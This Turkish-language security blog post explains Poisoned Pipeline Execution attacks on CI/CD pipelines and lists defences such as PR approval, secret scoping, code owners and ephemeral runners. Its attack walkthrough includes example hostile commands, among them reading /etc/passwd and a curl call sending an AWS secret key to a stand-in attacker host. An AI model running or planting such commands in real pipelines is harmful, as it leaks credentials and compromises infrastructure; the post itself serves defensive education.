# CI/CD Pipeline Saldırıları: Poisoned Pipeline Execution (PPE)

Siber güvenlik dünyasında, özellikle DevSecOps süreçlerinde giderek daha fazla karşılaşılan ve sistemleri derinden sarsabilen kritik bir konu bulunmaktadır: **Poisoned Pipeline Execution (PPE)**, yani Zehirlenmiş Pipeline Çalıştırması.

Son zamanlarda CI/CD (Sürekli Entegrasyon ve Sürekli Dağıtım) süreçlerine yönelik saldırılar oldukça popülerleşti. Uygulamaları hızlıca canlıya almak için kurulan bu otomatik sistemler, eğer doğru yapılandırılmazsa, saldırganlar için adeta altın tepside sunulmuş bir arka kapı haline gelebiliyor.

![CI/CD Pipeline Attack](/blogs/img/poisoned-pipeline-execution-ppe/1.png)

---

## Poisoned Pipeline Execution (PPE) Nedir?

Basitçe anlatmak gerekirse PPE, bir saldırganın sistemdeki CI/CD pipeline'ını kendi kötü amaçlı kodlarını çalıştıracak şekilde manipüle etmesidir. 

Normalde kod depolarında (GitHub, GitLab, Bitbucket vb.) `.github/workflows/main.yml`, `.gitlab-ci.yml` veya `Jenkinsfile` gibi pipeline yapılandırma dosyaları bulunur. Eğer bir saldırgan kaynak kod deposuna bir Pull Request (PR) açarak veya doğrudan kod göndererek bu dosyaları değiştirebilirse, CI/CD sunucusu (Runner) saldırganın belirlediği komutları en yetkili şekilde çalıştıracaktır.

Çünkü çoğu zaman CI/CD pipeline'ları, gizli anahtarlara (secrets), production sunucularına ve bulut altyapısına doğrudan erişim yetkisine sahiptir.

---

## PPE Nasıl Gerçekleşir?

Olay genellikle şu adımlarla gelişir:

1. **Zafiyetin Tespiti:** Saldırgan, dışarıdan PR (Pull Request) kabul eden ve bu PR'lardaki değişiklikleri CI/CD süreçlerinde otomatik olarak çalıştıran bir açık kaynaklı proje veya dışarıya açık bir repository bulur.
2. **Pipeline Dosyasına Müdahale:** Saldırgan, projeyi kendi hesabına fork'lar ve `.gitlab-ci.yml` veya `.github/workflows/main.yml` dosyasını düzenler. İçerisine `env`, `cat /etc/passwd`, veya `curl http://saldirgan.com/?key=$AWS_SECRET_KEY` gibi zararlı komutlar ekler.
3. **Zehirli PR'ın Gönderilmesi:** Yaptığı değişiklikleri ana depoya Pull Request olarak gönderir.
4. **Zehirlenmiş Pipeline'ın Tetiklenmesi:** Ana depo, "Yeni bir PR geldi, testleri çalıştırayım" diyerek saldırganın değiştirdiği yapılandırma dosyası ile pipeline'ı tetikler.
5. **Boom!:** Kod, CI sunucusunda (runner) çalışır. Saldırgan ortam değişkenlerini (environment variables) okur, cloud credientials'larını ele geçirir veya runner içerisinden iç ağa sızar.

![PPE Flow](/blogs/img/poisoned-pipeline-execution-ppe/2.png)

---

## Doğrudan (Direct) ve Dolaylı (Indirect) PPE

PPE saldırıları genellikle iki kategoriye ayrılır:

### 1. Direct PPE (D-PPE)
Saldırganın doğrudan CI/CD yapılandırma dosyasını (`.gitlab-ci.yml` vb.) değiştirdiği durumdur. Eğer sistem dışarıdan gelen PR'lardaki yapılandırma dosyalarını otomatik çalıştırıyorsa, bu en tehlikeli senaryodur.

### 2. Indirect PPE (I-PPE)
Saldırgan yapılandırma dosyasını değiştiremez. Ancak pipeline içerisinde çağrılan, örneğin bir `Makefile`, `build.sh` veya `package.json` içerisindeki test scriptlerini değiştirir. Pipeline çalıştığında zaten bu dosyaları execute edeceği için, dolaylı yoldan zararlı kod çalıştırılmış olur.

---

## Nasıl Korunuruz?

Bu tür saldırılardan korunmak için pipeline mimarisini sıkılaştırmak gerekmektedir. Projelerde kullanılması gereken bazı temel adımlar şunlar:

### 1. PR'ları Otomatik Çalıştırmayın
Özellikle public (herkese açık) depolarda, dışarıdan gelen PR'lar için pipeline'ların otomatik tetiklenmesini engelleyin. Yetkili bir geliştiricinin onayından sonra (Approval) pipeline'ın çalışması en güvenli yöntemdir.

### 2. Secret'ları Koruyun
Sadece güvenilir branch'lerin (örneğin `main` veya `production`) secret'lara erişebildiğinden emin olun. Herhangi bir feature branch'inin kritik AWS anahtarlarına erişmesine gerek yoktur.

### 3. Pipeline Dosyalarını Kitleyin (Code Owners)
`.gitlab-ci.yml` veya `.github/workflows/` dizinindeki dosyaların değiştirilmesini kısıtlayın. Bu dosyalara yapılacak değişikliklerin yalnızca DevOps veya Güvenlik ekibinin onayından geçmesini (Code Owners kullanarak) zorunlu kılın.

### 4. Runner İzolasyonu (Efemeral Runner'lar)
Pipeline'ları kalıcı (persistent) sunucularda değil, iş bittiğinde kendini yok eden (ephemeral) izole container'larda çalıştırın. Böylece bir saldırgan runner'ı ele geçirse bile elde edeceği bilgiler kısıtlı kalacaktır.

---

## Sonuç

CI/CD süreçleri yazılım geliştirme yaşam döngüsünü inanılmaz kolaylaştırıyor, ancak güvenlik arka plana atılmamalıdır. Poisoned Pipeline Execution saldırıları, küçük bir konfigürasyon hatasının tüm altyapıyı tehlikeye atabileceğini gösteren kritik bir örnektir. 

